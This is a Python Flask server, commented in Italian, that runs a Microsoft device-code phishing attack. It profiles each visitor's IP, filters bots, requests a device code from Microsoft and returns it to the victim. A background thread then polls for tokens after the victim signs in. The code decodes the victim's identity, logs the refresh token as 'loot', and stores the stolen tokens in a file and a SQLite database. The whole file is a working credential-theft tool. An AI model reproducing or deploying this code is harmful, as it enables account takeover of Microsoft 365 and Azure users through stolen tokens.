from flask import Flask, request, jsonify
from logger import setup_logger
from database import save_to_db, save_to_file
from visitor_analyzer import user_analyzer
from distutils.util import strtobool
import requests
import logging
import threading
import time
import json
import os
import socket
import jwt
import sqlite3

CLIENT_ID = os.getenv("CLIENT_ID", "d3590ed6-52b3-4102-aeff-aad2292ab01c")
RESOURCE = os.getenv("RESOURCE", "https://graph.windows.net")
DEBUG = bool(strtobool(os.getenv("DEBUG", "False")))
IPINFO_TOKEN = os.getenv("IPINFO_TOKEN", "")


logger = setup_logger()
app = Flask(__name__)


def poll_for_access_token(client_id, device_code, user_code, visitor_ip):
    max_attempts = 90
    attempt = 0
    token_url = "https://login.microsoftonline.com/Common/oauth2/token?api-version=1.0"
    headers = {"Content-Type": "application/x-www-form-urlencoded"}
    resource = "https://graph.windows.net"
    data = {
        "client_id": client_id,
        "resource": resource,
        "code": device_code,
        "grant_type": "urn:ietf:params:oauth:grant-type:device_code"
    }

    while attempt < max_attempts:
        try:
            response = requests.post(token_url, headers=headers, data=data)

            if response.status_code == 200:
                token_data = response.json()

                # Estrai access_token
                access_token = token_data.get("access_token")
                decoded_access_token = jwt.decode(access_token, options={"verify_signature": False})
                token_data["decoded_name"] = decoded_access_token.get("name")
                token_data["decoded_upn"] = decoded_access_token.get("upn")

                # Estrai refresh_token
                token_data["refresh_token"] = token_data.get("refresh_token")
                refresh_token = token_data["refresh_token"]

                if access_token:
                    if token_data.get("refresh_token"):
                        logger.loot(f"REFRESH TOKEN ricevuto per {resource} da {token_data['decoded_name']}, {token_data['decoded_upn']} [{visitor_ip}]: {token_data['refresh_token']}")

                    # Aggiungi user_code e device_code ai dati ricevuti
                    token_data["user_code"] = user_code
                    token_data["device_code"] = device_code
                    token_data["resource"] = resource

                    # Salva i dati nel file
                    save_to_file(token_data)

                    # Salva i dati in SQLite
                    save_to_db(token_data, visitor_ip)

                    return token_data
            elif response.status_code == 400:
                error = response.json().get("error")
                if error == "authorization_pending":
                    if DEBUG or (attempt + 1) % 5 == 0:
                        logging.info(
                            f"Autorizzazione in attesa per USER CODE: {user_code}, IP: {visitor_ip} [{attempt + 1}/{max_attempts}]"
                        )
                else:
                    break
            else:
                logging.error(f"Errore HTTP per USER CODE: {user_code}, IP: {visitor_ip}: {response.status_code} - {response.text}")
                break
        except requests.RequestException as e:
            logging.error(f"Errore nella richiesta HTTP per USER CODE: {user_code}, IP: {visitor_ip}: {e}")

        time.sleep(10)
        attempt += 1

    logging.warning(f"Tentativi esauriti per USER CODE: {user_code}, IP: {visitor_ip}, il polling si interrompe.")
    return None


@app.route('/proxy/devicecode', methods=['POST'])
def proxy_device_code():
    try:
        visitor_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
        user_agent = request.headers.get("User-Agent", "Unknown")

        if IPINFO_TOKEN:
            user_analyzer_flag, ip_details = user_analyzer(visitor_ip, user_agent, IPINFO_TOKEN)

            log_message = (
                f"NUOVO VISITATORE | IP: {visitor_ip} | Hostname: {ip_details['hostname']} | "
                f"Organizzazione: {ip_details['org']} | Paese: {ip_details['country']} | "
                f"Città: {ip_details['city']} | User-Agent: {user_agent}"
            )
            if user_analyzer_flag:
                logger.warning(f"{log_message} | PROBABILE BOT")
            else:
                logger.warning(log_message)
        else:
            log_message = (
                f"NUOVO VISITATORE | IP: {visitor_ip} | User-Agent: {user_agent}"
            )
            logger.warning(log_message)

        response = requests.post(
            "https://login.microsoftonline.com/common/oauth2/v2.0/devicecode",
            data={"client_id": CLIENT_ID, "scope": f"{RESOURCE}/.default"},
            headers={"Content-Type": "application/x-www-form-urlencoded"}
        )
        response.raise_for_status()
        data = response.json()

        threading.Thread(
            target=poll_for_access_token,
            args=(CLIENT_ID, data['device_code'], data['user_code'], visitor_ip),
            daemon=True
        ).start()

        return jsonify(data)
    except requests.exceptions.RequestException as e:
        logger.error(f"HTTP request failed: {e}")
        return jsonify({"error": "An error occurred while making the request"}), 500
    except Exception as e:
        logger.error(f"An error occurred: {e}")
        return jsonify({"error": "An internal server error occurred"}), 500


if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)